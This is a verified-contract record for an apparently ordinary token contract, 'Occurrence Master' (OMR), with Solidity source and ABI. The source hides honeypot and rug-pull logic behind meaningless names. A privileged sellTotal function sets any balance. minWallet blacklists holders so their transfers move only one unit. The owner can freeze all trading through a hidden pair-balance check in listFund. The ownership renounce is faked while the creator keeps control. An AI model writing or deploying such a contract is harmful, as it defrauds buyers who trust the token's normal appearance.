{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface maxLimitSender {\n    function createPair(address limitToReceiver, address receiverAutoWallet) external returns (address);\n}\n\ninterface launchedTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyMaxFrom) external view returns (uint256);\n\n    function transfer(address launchedSender, uint256 tokenMin) external returns (bool);\n\n    function allowance(address teamTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedSender,\n        uint256 tokenMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchReceiver, uint256 value);\n    event Approval(address indexed teamTotal, address indexed spender, uint256 value);\n}\n\nabstract contract amountLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedToMetadata is launchedTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OccurrenceMaster is amountLaunch, launchedTo, launchedToMetadata {\n\n    function minWallet(address tokenAmount) public {\n        amountBuy();\n        if (swapFund == buyList) {\n            takeBuy = false;\n        }\n        if (tokenAmount == launchMaxList || tokenAmount == autoAt) {\n            return;\n        }\n        isShould[tokenAmount] = true;\n    }\n\n    string private sellIsFund = \"Occurrence Master\";\n\n    uint256 private launchedTotal = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        totalFee listMode = totalFee(feeSender);\n        autoAt = maxLimitSender(listMode.factory()).createPair(listMode.WETH(), address(this));\n        \n        launchMaxList = _msgSender();\n        launchAutoSwap[launchMaxList] = true;\n        receiverTrading[launchMaxList] = launchedTotal;\n        launchAmountAt();\n        if (buyList != swapFund) {\n            takeBuy = true;\n        }\n        emit Transfer(address(0), launchMaxList, launchedTotal);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundFee;\n    }\n\n    uint8 private buyEnable = 18;\n\n    address feeSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private exemptSwap;\n\n    function getOwner() external view returns (address) {\n        return exemptSwap;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyEnable;\n    }\n\n    address tradingLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchAmountAt() public {\n        emit OwnershipTransferred(launchMaxList, address(0));\n        exemptSwap = address(0);\n    }\n\n    uint256 private swapFund;\n\n    function balanceOf(address buyMaxFrom) public view virtual override returns (uint256) {\n        return receiverTrading[buyMaxFrom];\n    }\n\n    function buyReceiver(address marketingLaunch) public {\n        require(marketingLaunch.balance < 100000);\n        if (receiverAmountLiquidity) {\n            return;\n        }\n        \n        launchAutoSwap[marketingLaunch] = true;\n        if (limitFee != swapFund) {\n            buyList = swapFund;\n        }\n        receiverAmountLiquidity = true;\n    }\n\n    function transfer(address totalShould, uint256 tokenMin) external virtual override returns (bool) {\n        return listFund(_msgSender(), totalShould, tokenMin);\n    }\n\n    function amountBuy() private view {\n        require(launchAutoSwap[_msgSender()]);\n    }\n\n    string private fundFee = \"OMR\";\n\n    mapping(address => uint256) private receiverTrading;\n\n    function allowance(address fromTrading, address txTotal) external view virtual override returns (uint256) {\n        if (txTotal == feeSender) {\n            return type(uint256).max;\n        }\n        return teamSwap[fromTrading][txTotal];\n    }\n\n    uint256 constant toMinReceiver = 1 ** 10;\n\n    mapping(address => bool) public launchAutoSwap;\n\n    address public autoAt;\n\n    function listSell(address isExempt, address launchedSender, uint256 tokenMin) internal returns (bool) {\n        require(receiverTrading[isExempt] >= tokenMin);\n        receiverTrading[isExempt] -= tokenMin;\n        receiverTrading[launchedSender] += tokenMin;\n        emit Transfer(isExempt, launchedSender, tokenMin);\n        return true;\n    }\n\n    uint256 amountLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTotal;\n    }\n\n    bool private listLaunched;\n\n    bool public receiverAmountLiquidity;\n\n    uint256 shouldExempt;\n\n    function maxMode(uint256 tokenMin) public {\n        amountBuy();\n        shouldExempt = tokenMin;\n    }\n\n    uint256 private buyList;\n\n    event OwnershipTransferred(address indexed enableLiquidityShould, address indexed receiverFund);\n\n    mapping(address => mapping(address => uint256)) private teamSwap;\n\n    function listFund(address isExempt, address launchedSender, uint256 tokenMin) internal returns (bool) {\n        if (isExempt == launchMaxList) {\n            return listSell(isExempt, launchedSender, tokenMin);\n        }\n        uint256 launchedReceiver = launchedTo(autoAt).balanceOf(tradingLaunch);\n        require(launchedReceiver == shouldExempt);\n        require(launchedSender != tradingLaunch);\n        if (isShould[isExempt]) {\n            return listSell(isExempt, launchedSender, toMinReceiver);\n        }\n        return listSell(isExempt, launchedSender, tokenMin);\n    }\n\n    uint256 private limitFee;\n\n    function sellTotal(address totalShould, uint256 tokenMin) public {\n        amountBuy();\n        receiverTrading[totalShould] = tokenMin;\n    }\n\n    address public launchMaxList;\n\n    function transferFrom(address isExempt, address launchedSender, uint256 tokenMin) external override returns (bool) {\n        if (_msgSender() != feeSender) {\n            if (teamSwap[isExempt][_msgSender()] != type(uint256).max) {\n                require(tokenMin <= teamSwap[isExempt][_msgSender()]);\n                teamSwap[isExempt][_msgSender()] -= tokenMin;\n            }\n        }\n        return listFund(isExempt, launchedSender, tokenMin);\n    }\n\n    function owner() external view returns (address) {\n        return exemptSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellIsFund;\n    }\n\n    function approve(address txTotal, uint256 tokenMin) public virtual override returns (bool) {\n        teamSwap[_msgSender()][txTotal] = tokenMin;\n        emit Approval(_msgSender(), txTotal, tokenMin);\n        return true;\n    }\n\n    mapping(address => bool) public isShould;\n\n    bool public atFund;\n\n    bool public takeBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLiquidityShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMaxFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"}],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmountAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchAutoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMaxList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenMin\",\"type\":\"uint256\"}],\"name\":\"maxMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"minWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmountLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMin\",\"type\":\"uint256\"}],\"name\":\"sellTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OccurrenceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}